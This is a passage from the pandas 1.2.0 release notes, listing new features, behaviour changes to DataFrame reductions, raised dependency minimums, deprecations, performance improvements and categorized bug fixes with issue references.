:meth:`PeriodIndex.searchsorted`, and :meth:`Series.searchsorted` with datetime-like dtypes will now try to cast string arguments (list-like and scalar) to the matching datetime-like type (:issue:`36346`)\n- Added methods :meth:`IntegerArray.prod`, :meth:`IntegerArray.min`, and :meth:`IntegerArray.max` (:issue:`33790`)\n- Calling a NumPy ufunc on a ``DataFrame`` with extension types now preserves the extension types when possible (:issue:`23743`)\n- Calling a binary-input NumPy ufunc on multiple ``DataFrame`` objects now aligns, matching the behavior of binary operations and ufuncs on ``Series`` (:issue:`23743`).\n  This change has been reverted in pandas 1.2.1, and the behaviour to not align DataFrames\n  is deprecated instead, see the :ref:`the 1.2.1 release notes <whatsnew_121.ufunc_deprecation>`.\n- Where possible :meth:`RangeIndex.difference` and :meth:`RangeIndex.symmetric_difference` will return :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`36564`)\n- :meth:`DataFrame.to_parquet` now supports :class:`MultiIndex` for columns in parquet format (:issue:`34777`)\n- :func:`read_parquet` gained a ``use_nullable_dtypes=True`` option to use nullable dtypes that use ``pd.NA`` as missing value indicator where possible for the resulting DataFrame (default is ``False``, and only applicable for ``engine=\"pyarrow\"``) (:issue:`31242`)\n- Added :meth:`.Rolling.sem` and :meth:`Expanding.sem` to compute the standard error of the mean (:issue:`26476`)\n- :meth:`.Rolling.var` and :meth:`.Rolling.std` use Kahan summation and Welford's Method to avoid numerical issues (:issue:`37051`)\n- :meth:`DataFrame.corr` and :meth:`DataFrame.cov` use Welford's Method to avoid numerical issues (:issue:`37448`)\n- :meth:`DataFrame.plot` now recognizes ``xlabel`` and ``ylabel`` arguments for plots of type ``scatter`` and ``hexbin`` (:issue:`37001`)\n- :class:`DataFrame` now supports the ``divmod`` operation (:issue:`37165`)\n- :meth:`DataFrame.to_parquet` now returns a ``bytes`` object when no ``path`` argument is passed (:issue:`37105`)\n- :class:`.Rolling` now supports the ``closed`` argument for fixed windows (:issue:`34315`)\n- :class:`.DatetimeIndex` and :class:`Series` with ``datetime64`` or ``datetime64tz`` dtypes now support ``std`` (:issue:`37436`)\n- :class:`Window` now supports all Scipy window types in ``win_type`` with flexible keyword argument support (:issue:`34556`)\n- :meth:`testing.assert_index_equal` now has a ``check_order`` parameter that allows indexes to be checked in an order-insensitive manner (:issue:`37478`)\n- :func:`read_csv` supports memory-mapping for compressed files (:issue:`37621`)\n- Add support for ``min_count`` keyword for :meth:`DataFrame.groupby` and :meth:`DataFrame.resample` for functions ``min``, ``max``, ``first`` and ``last`` (:issue:`37821`, :issue:`37768`)\n- Improve error reporting for :meth:`DataFrame.merge` when invalid merge column definitions were given (:issue:`16228`)\n- Improve numerical stability for :meth:`.Rolling.skew`, :meth:`.Rolling.kurt`, :meth:`Expanding.skew` and :meth:`Expanding.kurt` through implementation of Kahan summation (:issue:`6929`)\n- Improved error reporting for subsetting columns of a :class:`.DataFrameGroupBy` with ``axis=1`` (:issue:`37725`)\n- Implement method ``cross`` for :meth:`DataFrame.merge` and :meth:`DataFrame.join` (:issue:`5401`)\n- When :func:`read_csv`, :func:`read_sas` and :func:`read_json` are called with ``chunksize``/``iterator`` they can be used in a ``with`` statement as they return context-managers (:issue:`38225`)\n- Augmented the list of named colors available for styling Excel exports, enabling all of CSS4 colors (:issue:`38247`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\nConsistency of DataFrame Reductions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n:meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True`` now\ndetermines whether to exclude object-dtype columns on a column-by-column basis,\ninstead of checking if *all* object-dtype columns can be considered boolean.\n\nThis prevents pathological behavior where applying the reduction on a subset\nof columns could result in a larger Series result. See (:issue:`37799`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"A\": [\"foo\", \"bar\"], \"B\": [True, False]}, dtype=object)\n    df[\"C\"] = pd.Series([True, True])\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.all(bool_only=True)\n    Out[5]:\n    C    True\n    dtype: bool\n\n    In [6]: df[[\"B\", \"C\"]].all(bool_only=True)\n    Out[6]:\n    B    False\n    C    True\n    dtype: bool\n\n*New behavior*:\n\n.. ipython:: python\n   :okwarning:\n\n    In [5]: df.all(bool_only=True)\n\n    In [6]: df[[\"B\", \"C\"]].all(bool_only=True)\n\n\nOther DataFrame reductions with ``numeric_only=None`` will also avoid\nthis pathological behavior (:issue:`37827`):\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"A\": [0, 1, 2], \"B\": [\"a\", \"b\", \"c\"]}, dtype=object)\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.mean()\n    Out[3]: Series([], dtype: float64)\n\n    In [4]: df[[\"A\"]].mean()\n    Out[4]:\n    A    1.0\n    dtype: float64\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.mean()\n    Out[3]:\n    A    1.0\n    dtype: float64\n\n    In [4]: df[[\"A\"]].mean()\n    Out[4]:\n    A    1.0\n    dtype: float64\n\nMoreover, DataFrame reductions with ``numeric_only=None`` will now be\nconsistent with their Series counterparts.  In particular, for\nreductions where the Series method raises ``TypeError``, the\nDataFrame reduction will now consider that column non-numeric\ninstead of casting to a NumPy array which may have different semantics (:issue:`36076`,\n:issue:`28949`, :issue:`21020`).\n\n.. ipython:: python\n   :okwarning:\n\n    ser = pd.Series([0, 1], dtype=\"category\", name=\"A\")\n    df = ser.to_frame()\n\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.any()\n    Out[5]:\n    A    True\n    dtype: bool\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.any()\n    Out[5]: Series([], dtype: bool)\n\n\n.. _whatsnew_120.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.2.0 supports Python 3.7.1 and higher (:issue:`35214`).\n\n.. _whatsnew_120.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`35214`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.16.5          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2017.3          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.7.3           |    X     |         |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.8           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 5.0.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.782           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |         |\n+-----------------+-----------------+---------+\n| lxml            | 4.3.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.3           |    X    |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |         |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.6.0           |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.15.0          |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.11          |    X    |\n+-----------------+-----------------+---------+\n| pytables        | 3.5.1           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| scipy           | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.2.8           |    X    |\n+-----------------+-----------------+---------+\n| xarray          | 0.12.3          |    X    |\n+-----------------+-----------------+---------+\n| xlrd            | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 1.0.2           |    X    |\n+-----------------+-----------------+---------+\n| xlwt            | 1.3.0           |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 0.12.0          |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_120.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- Sorting in descending order is now stable for :meth:`Series.sort_values` and :meth:`Index.sort_values` for Datetime-like :class:`Index` subclasses. This will affect sort order when sorting a DataFrame on multiple columns, sorting with a key function that produces duplicates, or requesting the sorting index when using :meth:`Index.sort_values`. When using :meth:`Series.value_counts`, the count of missing values is no longer necessarily last in the list of duplicate counts. Instead, its position corresponds to the position in the original Series. When using :meth:`Index.sort_values` for Datetime-like :class:`Index` subclasses, NaTs ignored the ``na_position`` argument and were sorted to the beginning. Now they respect ``na_position``, the default being ``last``, same as other :class:`Index` subclasses (:issue:`35992`)\n- Passing an invalid ``fill_value`` to :meth:`Categorical.take`, :meth:`.DatetimeArray.take`, :meth:`TimedeltaArray.take`, or :meth:`PeriodArray.take` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Passing an invalid ``fill_value`` to :meth:`Series.shift` with a ``CategoricalDtype`` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Passing an invalid value to :meth:`IntervalIndex.insert` or :meth:`CategoricalIndex.insert` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- Attempting to reindex a Series with a :class:`CategoricalIndex` with an invalid ``fill_value`` now raises a ``TypeError`` instead of a ``ValueError`` (:issue:`37733`)\n- :meth:`CategoricalIndex.append` with an index that contains non-category values will now cast instead of raising ``TypeError`` (:issue:`38098`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n- Deprecated parameter ``inplace`` in :meth:`MultiIndex.set_codes` and :meth:`MultiIndex.set_levels` (:issue:`35626`)\n- Deprecated parameter ``dtype`` of method :meth:`~Index.copy` for all :class:`Index` subclasses. Use the :meth:`~Index.astype` method instead for changing dtype (:issue:`35853`)\n- Deprecated parameters ``levels`` and ``codes`` in :meth:`MultiIndex.copy`. Use the :meth:`~MultiIndex.set_levels` and :meth:`~MultiIndex.set_codes` methods instead (:issue:`36685`)\n- Date parser functions :func:`~pandas.io.date_converters.parse_date_time`, :func:`~pandas.io.date_converters.parse_date_fields`, :func:`~pandas.io.date_converters.parse_all_fields` and :func:`~pandas.io.date_converters.generic_parser` from ``pandas.io.date_converters`` are deprecated and will be removed in a future version; use :func:`to_datetime` instead (:issue:`35741`)\n- :meth:`DataFrame.lookup` is deprecated and will be removed in a future version, use :meth:`DataFrame.melt` and :meth:`DataFrame.loc` instead (:issue:`35224`)\n- The method :meth:`Index.to_native_types` is deprecated. Use ``.astype(str)`` instead (:issue:`28867`)\n- Deprecated indexing :class:`DataFrame` rows with a single datetime-like string as ``df[string]`` (given the ambiguity whether it is indexing the rows or selecting a column), use ``df.loc[string]`` instead (:issue:`36179`)\n- Deprecated :meth:`Index.is_all_dates` (:issue:`27744`)\n- The default value of ``regex`` for :meth:`Series.str.replace` will change from ``True`` to ``False`` in a future release. In addition, single character regular expressions will *not* be treated as literal strings when ``regex=True`` is set (:issue:`24804`)\n- Deprecated automatic alignment on comparison operations between :class:`DataFrame` and :class:`Series`, do ``frame, ser = frame.align(ser, axis=1, copy=False)`` before e.g. ``frame == ser`` (:issue:`28759`)\n- :meth:`Rolling.count` with ``min_periods=None`` will default to the size of the window in a future version (:issue:`31302`)\n- Using \"outer\" ufuncs on DataFrames to return 4d ndarray is now deprecated. Convert to an ndarray first (:issue:`23743`)\n- Deprecated slice-indexing on tz-aware :class:`DatetimeIndex` with naive ``datetime`` objects, to match scalar indexing behavior (:issue:`36148`)\n- :meth:`Index.ravel` returning a ``np.ndarray`` is deprecated, in the future this will return a view on the same index (:issue:`19956`)\n- Deprecate use of strings denoting units with 'M', 'Y' or 'y' in :func:`~pandas.to_timedelta` (:issue:`36666`)\n- :class:`Index` methods ``&``, ``|``, and ``^`` behaving as the set operations :meth:`Index.intersection`, :meth:`Index.union`, and :meth:`Index.symmetric_difference`, respectively, are deprecated and in the future will behave as pointwise boolean operations matching :class:`Series` behavior.  Use the named set methods instead (:issue:`36758`)\n- :meth:`Categorical.is_dtype_equal` and :meth:`CategoricalIndex.is_dtype_equal` are deprecated, will be removed in a future version (:issue:`37545`)\n- :meth:`Series.slice_shift` and :meth:`DataFrame.slice_shift` are deprecated, use :meth:`Series.shift` or :meth:`DataFrame.shift` instead (:issue:`37601`)\n- Partial slicing on unordered :class:`.DatetimeIndex` objects with keys that are not in the index is deprecated and will be removed in a future version (:issue:`18531`)\n- The ``how`` keyword in :meth:`PeriodIndex.astype` is deprecated and will be removed in a future version, use ``index.to_timestamp(how=how)`` instead (:issue:`37982`)\n- Deprecated :meth:`Index.asi8` for :class:`Index` subclasses other than :class:`.DatetimeIndex`, :class:`.TimedeltaIndex`, and :class:`PeriodIndex` (:issue:`37877`)\n- The ``inplace`` parameter of :meth:`Categorical.remove_unused_categories` is deprecated and will be removed in a future version (:issue:`37643`)\n- The ``null_counts`` parameter of :meth:`DataFrame.info` is deprecated and replaced by ``show_counts``. It will be removed in a future version (:issue:`37999`)\n\n**Calling NumPy ufuncs on non-aligned DataFrames**\n\nCalling NumPy ufuncs on non-aligned DataFrames changed behaviour in pandas\n1.2.0 (to align the inputs before calling the ufunc), but this change is\nreverted in pandas 1.2.1. The behaviour to not align is now deprecated instead,\nsee the :ref:`the 1.2.1 release notes <whatsnew_121.ufunc_deprecation>` for\nmore details.\n\n.. ---------------------------------------------------------------------------\n\n\n.. _whatsnew_120.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvements when creating DataFrame or Series with dtype ``str`` or :class:`StringDtype` from array with many string elements (:issue:`36304`, :issue:`36317`, :issue:`36325`, :issue:`36432`, :issue:`37371`)\n- Performance improvement in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` with the ``numba`` engine (:issue:`35759`)\n- Performance improvements when creating :meth:`Series.map` from a huge dictionary (:issue:`34717`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` with the ``numba`` engine (:issue:`36240`)\n- :class:`.Styler` uuid method altered to compress data transmission over web whilst maintaining reasonably low table collision probability (:issue:`36345`)\n- Performance improvement in :func:`to_datetime` with non-ns time unit for ``float`` ``dtype`` columns (:issue:`20445`)\n- Performance improvement in setting values on an :class:`IntervalArray` (:issue:`36310`)\n- The internal index method :meth:`~Index._shallow_copy` now makes the new index and original index share cached attributes, avoiding creating these again, if created on either. This can speed up operations that depend on creating copies of existing indexes (:issue:`36840`)\n- Performance improvement in :meth:`.RollingGroupby.count` (:issue:`35625`)\n- Small performance decrease to :meth:`.Rolling.min` and :meth:`.Rolling.max` for fixed windows (:issue:`36567`)\n- Reduced peak memory usage in :meth:`DataFrame.to_pickle` when using ``protocol=5`` in python 3.8+ (:issue:`34244`)\n- Faster ``dir`` calls when the object has many index labels, e.g. ``dir(ser)`` (:issue:`37450`)\n- Performance improvement in :class:`ExpandingGroupby` (:issue:`37064`)\n- Performance improvement in :meth:`Series.astype` and :meth:`DataFrame.astype` for :class:`Categorical` (:issue:`8628`)\n- Performance improvement in :meth:`DataFrame.groupby` for ``float`` ``dtype`` (:issue:`28303`), changes of the underlying hash-function can lead to changes in float based indexes sort ordering for ties (e.g. :meth:`Index.value_counts`)\n- Performance improvement in :meth:`pd.isin` for inputs with more than 1e6 elements (:issue:`36611`)\n- Performance improvement for :meth:`DataFrame.__setitem__` with list-like indexers (:issue:`37954`)\n- :meth:`read_json` now avoids reading entire file into memory when chunksize is specified (:issue:`34548`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- :meth:`Categorical.fillna` will always return a copy, validate a passed fill value regardless of whether there are any NAs to fill, and disallow an ``NaT`` as a fill value for numeric categories (:issue:`36530`)\n- Bug in :meth:`Categorical.__setitem__` that incorrectly raised when trying to set a tuple value (:issue:`20439`)\n- Bug in :meth:`CategoricalIndex.equals` incorrectly casting non-category entries to ``np.nan`` (:issue:`37667`)\n- Bug in :meth:`CategoricalIndex.where` incorrectly setting non-category entries to ``np.nan`` instead of raising ``TypeError`` (:issue:`37977`)\n- Bug in :meth:`Categorical.to_numpy` and ``np.array(categorical)`` with tz-aware ``datetime64`` categories incorrectly dropping the time zone information instead of casting to object dtype (:issue:`38136`)\n\nDatetime-like\n^^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.combine_first` that would convert datetime-like column on other :class:`DataFrame` to integer when the column is not present in original :class:`DataFrame` (:issue:`28481`)\n- Bug in :attr:`.DatetimeArray.date` where a ``ValueError`` would be raised with a read-only backing array (:issue:`33530`)\n- Bug in ``NaT`` comparisons failing to raise ``TypeError`` on invalid inequality comparisons (:issue:`35046`)\n- Bug in :class:`.DateOffset` where attributes reconstructed from pickle files differ from original objects when input values exceed normal ranges (e.g. months=12) (:issue:`34511`)\n- Bug in :meth:`.DatetimeIndex.get_slice_bound` where ``datetime.date`` objects were not accepted or naive :class:`Timestamp` with a tz-aware :class:`.DatetimeIndex` (:issue:`35690`)\n- Bug in :meth:`.DatetimeIndex.slice_locs` where ``datetime.date`` objects were not accepted (:issue:`34077`)\n- Bug in :meth:`.DatetimeIndex.searchsorted`, :meth:`.TimedeltaIndex.searchsorted`, :meth:`PeriodIndex.searchsorted`, and :meth:`Series.searchsorted` with ``datetime64``, ``timedelta64`` or :class:`Period` dtype placement of ``NaT`` values being inconsistent with NumPy (:issue:`36176`, :issue:`36254`)\n- Inconsistency in :class:`.DatetimeArray`, :class:`.TimedeltaArray`, and :class:`.PeriodArray` method ``__setitem__`` casting arrays of strings to datetime-like scalars but not scalar strings (:issue:`36261`)\n- Bug in :meth:`.DatetimeArray.take` incorrectly allowing ``fill_value`` with a mismatched time zone (:issue:`37356`)\n- Bug in :class:`.DatetimeIndex.shift` incorrectly raising when shifting empty indexes (:issue:`14811`)\n- :class:`Timestamp` and :class:`.DatetimeIndex` comparisons between tz-aware and tz-naive objects now follow the standard library ``datetime`` behavior, returning ``True``/``False`` for ``!=``/``==`` and raising for inequality comparisons (:issue:`28507`)\n- Bug in :meth:`.DatetimeIndex.equals` and :meth:`.TimedeltaIndex.equals` incorrectly considering ``int64`` indexes as equal (:issue:`36744`)\n- :meth:`Series.to_json`, :meth:`DataFrame.to_json`, and :meth:`read_json` now implement time zone parsing when orient structure is ``table`` (:issue:`35973`)\n- :meth:`astype` now attempts to convert to ``datetime64[ns, tz]`` directly from ``object`` with inferred time zone from string (:issue:`35973`)\n- Bug in :meth:`.TimedeltaIndex.sum` and :meth:`Series.sum` with ``timedelta64`` dtype on an empty index or series returning ``NaT`` instead of ``Timedelta(0)`` (:issue:`31751`)\n- Bug in :meth:`.DatetimeArray.shift` incorrectly allowing ``fill_value`` with a mismatched time zone (:issue:`37299`)\n- Bug in adding a :class:`.BusinessDay` with nonzero ``offset`` to a non-scalar other (:issue:`37457`)\n- Bug in :func:`to_datetime` with a read-only array incorrectly raising (:issue:`34857`)\n- Bug in :meth:`Series.isin` with ``datetime64[ns]`` dtype and :meth:`.DatetimeIndex.isin` incorrectly casting integers to datetimes (:issue:`36621`)\n- Bug in :meth:`Series.isin` with ``datetime64[ns]`` dtype and :meth:`.DatetimeIndex.isin` failing to consider tz-aware and tz-naive datetimes as always different (:issue:`35728`)\n- Bug in :meth:`Series.isin` with ``PeriodDtype`` dtype and :meth:`PeriodIndex.isin` failing to consider arguments with different ``PeriodDtype`` as always different (:issue:`37528`)\n- Bug in :class:`Period` constructor now correctly handles nanoseconds in the ``value`` argument (:issue:`34621` and :issue:`17053`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`.TimedeltaIndex`, :class:`Series`, and :class:`DataFrame` floor-division with ``timedelta64`` dtypes and ``NaT`` in the denominator (:issue:`35529`)\n- Bug in parsing of ISO 8601 durations in :class:`Timedelta` and :func:`to_datetime` (:issue:`29773`, :issue:`36204`)\n- Bug in :func:`to_timedelta` with a read-only array incorrectly raising (:issue:`34857`)\n- Bug in :class:`Timedelta` incorrectly truncating to sub-second portion of a string input when it has precision higher than nanoseconds (:issue:`36738`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :func:`date_range` was raising ``AmbiguousTimeError`` for valid input with ``ambiguous=False`` (:issue:`35297`)\n- Bug in :meth:`Timestamp.replace` was losing fold information (:issue:`37610`)\n\n\nNumeric\n^^^^^^^\n- Bug in :func:`to_numeric` where float precision was incorrect (:issue:`31364`)\n- Bug in :meth:`DataFrame.any` with ``axis=1`` and ``bool_only=True`` ignoring the ``bool_only`` keyword (:issue:`32432`)\n- Bug in :meth:`Series.equals` where a ``ValueError`` was raised when NumPy arrays were compared to scalars (:issue:`35267`)\n- Bug in :class:`Series` where two Series each have a :class:`.DatetimeIndex` with different time zones having those indexes incorrectly changed when performing arithmetic operations (:issue:`33671`)\n- Bug in :mod:`pandas.testing` module functions when used with ``check_exact=False`` on complex numeric types (:issue:`28235`)\n- Bug in :meth:`DataFrame.__rmatmul__` error handling reporting transposed shapes (:issue:`21581`)\n- Bug in :class:`Series` flex arithmetic methods where the result when operating with a ``list``, ``tuple`` or ``np.ndarray`` would have an incorrect name (:issue:`36760`)\n- Bug in :class:`.IntegerArray` multiplication with ``timedelta`` and ``np.timedelta64`` objects (:issue:`36870`)\n- Bug in :class:`MultiIndex` comparison with tuple incorrectly treating tuple as array-like (:issue:`21517`)\n- Bug in :meth:`DataFrame.diff` with ``datetime64`` dtypes including ``NaT`` values failing to fill ``NaT`` results correctly (:issue:`32441`)\n- Bug in :class:`DataFrame` arithmetic ops incorrectly accepting keyword arguments (:issue:`36843`)\n- Bug in :class:`.IntervalArray` comparisons with :class:`Series` not returning Series (:issue:`36908`)\n- Bug in :class:`DataFrame` allowing arithmetic operations with list of array-likes with undefined results. Behavior changed to raising ``ValueError`` (:issue:`36702`)\n- Bug in :meth:`DataFrame.std` with ``timedelta64`` dtype and ``skipna=False`` (:issue:`37392`)\n- Bug in :meth:`DataFrame.min` and :meth:`DataFrame.max` with ``datetime64`` dtype and ``skipna=False`` (:issue:`36907`)\n- Bug in :meth:`DataFrame.idxmax` and :meth:`DataFrame.idxmin` with mixed dtypes incorrectly raising ``TypeError`` (:issue:`38195`)\n\nConversion\n^^^^^^^^^^\n\n- Bug in :meth:`DataFrame.to_dict` with ``orient='records'`` now returns python native datetime objects for datetime-like columns (:issue:`21256`)\n- Bug in :meth:`Series.astype` conversion from ``string`` to ``float`` raised in presence of ``pd.NA`` values (:issue:`37626`)\n\nStrings\n^^^^^^^\n- Bug in :meth:`Series.to_string`, :meth:`DataFrame.to_string`, and :meth:`DataFrame.to_latex` adding a leading space when ``index=False`` (:issue:`24980`)\n- Bug in :func:`to_numeric` raising a ``TypeError`` when attempting to convert a string dtype Series containing only numeric strings and ``NA`` (:issue:`37262`)\n\nInterval\n^^^^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` where :class:`Interval` dtypes would be converted to object dtypes (:issue:`34871`)\n- Bug in :meth:`IntervalIndex.take` with negative indices and ``fill_value=None`` (:issue:`37330`)\n- Bug in :meth:`IntervalIndex.putmask` with datetime-like dtype incorrectly casting to object dtype (:issue:`37968`)\n- Bug in :meth:`IntervalArray.astype` incorrectly dropping dtype information with a :class:`CategoricalDtype` object (:issue:`37984`)\n\nIndexing\n^^^^^^^^\n\n- Bug in :meth:`PeriodIndex.get_loc` incorrectly raising ``ValueError`` on non-datelike strings instead of ``KeyError``, causing similar errors in :meth:`Series.__getitem__`, :meth:`Series.__contains__`, and :meth:`Series.loc.__getitem__` (:issue:`34240`)\n- Bug in :meth:`Index.sort_values` where, when empty values were passed, the method would break by trying to compare missing values instead of pushing them to the end of the sort order (:issue:`35584`)\n- Bug in :meth:`Index.get_indexer` and :meth:`Index.get_indexer_non_unique` where ``int64`` arrays are returned instead of ``intp`` (:issue:`36359`)\n- Bug in :meth:`DataFrame.sort_index` where parameter ascending passed as a list on a single level index gives wrong result (:issue:`32334`)\n- Bug in :meth:`DataFrame.reset_index` was incorrectly raising a ``ValueError`` for input with a :class:`MultiIndex` with missing values in a level with ``Categorical`` dtype (:issue:`24206`)\n- Bug in indexing with boolean masks on datetime-like values sometimes returning a view instead of a copy (:issue:`36210`)\n- Bug in :meth:`DataFrame.__getitem__` and :meth:`DataFrame.loc.__getitem__` with :class:`IntervalIndex` columns and a numeric indexer (:issue:`26490`)\n- Bug in :meth:`Series.loc.__getitem__` with a non-unique :class:`MultiIndex` and an empty-list indexer (:issue:`13691`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`MultiIndex` and a level named ``\"0\"`` (:issue:`37194`)\n- Bug in :meth:`Series.__getitem__` when using an unsigned integer array as an indexer giving incorrect results or segfaulting instead of raising ``KeyError`` (:issue:`37218`)\n- Bug in :meth:`Index.where` incorrectly casting numeric values to strings (:issue:`37591`)\n- Bug in :meth:`DataFrame.loc` returning empty result when indexer is a slice with negative step size (:issue:`38071`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` raises when the index was of ``object`` dtype and the given numeric label was in the index (:issue:`26491`)\n- Bug in :meth:`DataFrame.loc` returned requested key plus missing values when ``loc`` was applied to single level from a :class:`MultiIndex` (:issue:`27104`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`CategoricalIndex` using a list-like indexer containing NA values (:issue:`37722`)\n- Bug in :meth:`DataFrame.loc.__setitem__` expanding an empty :class:`DataFrame` with mixed dtypes (:issue:`37932`)\n- Bug in :meth:`DataFrame.xs` ignored ``droplevel=False`` for columns (:issue:`19056`)\n- Bug in :meth:`DataFrame.reindex` raising ``IndexingError`` wrongly for empty DataFrame with ``tolerance`` not ``None`` or ``method=\"nearest\"`` (:issue:`27315`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`CategoricalIndex` using list-like indexer that contains elements that are in the index's ``categories`` but not in the index itself failing to raise ``KeyError`` (:issue:`37901`)\n- Bug on inserting a boolean label into a :class:`DataFrame` with a numeric :class:`Index` columns incorrectly casting to integer (:issue:`36319`)\n- Bug in :meth:`DataFrame.iloc` and :meth:`Series.iloc` aligning objects in ``__setitem__`` (:issue:`22046`)\n- Bug in :meth:`MultiIndex.drop` does not raise if labels are partially found (:issue:`37820`)\n- Bug in :meth:`DataFrame.loc` did not raise ``KeyError`` when missing combination was given with ``slice(None)`` for remaining levels (:issue:`19556`)\n- Bug in :meth:`DataFrame.loc` raising ``TypeError`` when non-integer slice was given to select values from :class:`MultiIndex` (:issue:`25165`, :issue:`24263`)\n- Bug in :meth:`Series.at` returning :class:`Series` with one element instead of scalar when index is a :class:`MultiIndex` with one level (:issue:`38053`)\n- Bug in :meth:`DataFrame.loc` returning and assigning elements in wrong order when indexer is differently ordered than the :class:`MultiIndex` to filter (:issue:`31330`, :issue:`34603`)\n- Bug in :meth:`DataFrame.loc` and :meth:`DataFrame.__getitem__`  raising ``KeyError`` when columns were :class:`MultiIndex` with only one level (:issue:`29749`)\n- Bug in :meth:`Series.__getitem__` and :meth:`DataFrame.__getitem__` raising blank ``KeyError`` without missing keys for :class:`IntervalIndex` (:issue:`27365`)\n- Bug in setting a new label on a :class:`DataFrame` or :class:`Series` with a :class:`CategoricalIndex` incorrectly raising ``TypeError`` when the new label is not among the index's categories (:issue:`38098`)\n- Bug in :meth:`Series.loc` and :meth:`Series.iloc` raising ``ValueError`` when inserting a list-like ``np.array``, ``list`` or ``tuple`` in an ``object`` Series of equal length (:issue:`37748`, :issue:`37486`)\n- Bug in :meth:`Series.loc` and :meth:`Series.iloc` setting all the values of an ``object`` Series with those of a list-like ``ExtensionArray`` instead of inserting it (:issue:`38271`)\n\nMissing\n^^^^^^^\n\n- Bug in :meth:`.SeriesGroupBy.transform` now correctly handles missing values for ``dropna=False`` (:issue:`35014`)\n- Bug in :meth:`Series.nunique` with ``dropna=True`` was returning incorrect results when both ``NA`` and ``None`` missing values were present (:issue:`37566`)\n- Bug in :meth:`Series.interpolate` where kwarg ``limit_area`` and ``limit_direction`` had no effect when using methods ``pad`` and ``backfill`` (:issue:`31048`)\n\nMultiIndex\n^^^^^^^^^^\n\n- Bug in :meth:`DataFrame.xs` when used with :class:`IndexSlice` raises ``TypeError`` with message ``\"Expected label or tuple of labels\"`` (:issue:`35301`)\n- Bug in :meth:`DataFrame.reset_index` with ``NaT`` values in index raises ``ValueError`` with message ``\"cannot convert float NaN to integer\"`` (:issue:`36541`)\n- Bug in :meth:`DataFrame.combine_first` when used with :class:`MultiIndex` containing string and ``NaN`` values raises ``TypeError`` (:issue:`36562`)\n- Bug in :meth:`MultiIndex.drop` dropped ``NaN`` values when non existing key was given as input (:issue:`18853`)\n- Bug in :meth:`MultiIndex.drop` dropping more values than expected when index has duplicates and is not sorted 